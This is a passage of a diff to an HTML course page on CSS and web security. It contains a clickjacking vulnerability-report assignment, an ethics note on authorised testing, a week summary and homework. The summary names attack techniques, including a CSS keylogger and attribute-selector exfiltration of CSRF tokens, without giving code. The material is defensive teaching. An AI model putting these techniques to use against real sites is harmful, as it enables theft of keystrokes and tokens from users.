+<span class="cmt">/* Document this as a finding in your report */</span>
+</div>
+</div>
+
+<div class="step-block">
+  <div class="step-label">Part D — Vulnerability Report (60 min)</div>
+  <p>Write a one-page vulnerability report documenting all assessment findings. This is the first security report students produce — the format mirrors real-world responsible disclosure.</p>
+
+  <div class="box-blue">
+    <strong>Report Structure (save as <code>clickjacking-report.md</code> and commit to GitHub):</strong>
+    <ul>
+      <li><strong>Date &amp; Scope</strong> — assessor name, date, list of sites tested</li>
+      <li><strong>Findings Table</strong> — columns: Site, Loaded in iframe?, Protection method observed, Risk level (High / Low)</li>
+      <li><strong>Analysis</strong> — what percentage were protected, any surprising results</li>
+      <li><strong>Sample Disclosure</strong> — one paragraph written as if informing an unprotected site owner: what the vulnerability is, what an attacker could do, and the recommended fix (CSP <code>frame-ancestors</code> + <code>X-Frame-Options</code>)</li>
+    </ul>
+  </div>
+
+  <div class="box-orange" style="margin-top:12px;">
+    <strong>Ethics Note — Read Aloud:</strong> Testing whether a website loads in an iframe is a purely passive, read-only observation. It does not interact with, modify, or attack the site in any way. However, students must never attempt to exploit any vulnerability on a real site without written authorisation from the site owner. The correct professional response to finding a vulnerable site is to document it and, where appropriate, responsibly disclose it to the site owner — not to exploit it.
+  </div>
+</div>
+
+<!-- ── MODULE SUMMARY ── -->
+<div class="box-green" style="margin-top:36px;">
+  <strong>Week 2 (CSS) Summary — Skills Acquired:</strong>
+  <ul>
+    <li>CSS syntax: selectors, properties, values, the cascade, and specificity</li>
+    <li>The box model: content, padding, border, margin, and <code>box-sizing: border-box</code></li>
+    <li>Core properties: colours (hex, rgb, rgba), typography with rem units, display, and position</li>
+    <li>Flexbox: container and item properties, nav bars, card rows, centred content</li>
+    <li>CSS Grid: tracks, fr units, named areas, <code>auto-fit</code> + <code>minmax()</code>, spanning items</li>
+    <li>Responsive design: viewport meta, mobile-first, four breakpoints, <code>clamp()</code></li>
+    <li>CSS custom properties (variables) and a professional CSS reset</li>
+    <li>CSS keyframe animations and transitions</li>
+    <li>CSS injection: how it works, why user input must never reach a CSS value</li>
+    <li>CSS keylogger attack: attribute selectors + <code>background-image</code> as an exfiltration channel</li>
+    <li>Attribute-selector data exfiltration: why CSRF tokens must not be in HTML attributes</li>
+    <li>Clickjacking: the full CSS mechanism — iframe, opacity, z-index, absolute positioning</li>
+    <li>All four clickjacking defence layers: CSP <code>frame-ancestors</code>, <code>X-Frame-Options</code>, frame-busting JS, CSS visual warning</li>
+    <li>Vulnerable-to-secure rewrites for four CSS injection scenarios</li>
+    <li>Written a structured vulnerability report documenting real-site clickjacking findings</li>
+  </ul>
+</div>
+
+<div class="box-orange" style="margin-top: 20px;">
+  <strong>Homework (Due before Week 3):</strong> Complete the secure product page to a professional standard — all four clickjacking defences in place, fully responsive, no CSS injection vulnerabilities. It should be something you are proud to include in your portfolio. Additionally, read the OWASP Clickjacking Defence Cheat Sheet in full (publicly available at owasp.org) and write one paragraph summarising a defence technique not covered in class. Bring questions from Weeks 1 and 2 to Week 3 Day 1 — the first 15 minutes will be a review session.
+</div>
+
+</body>
+</html>
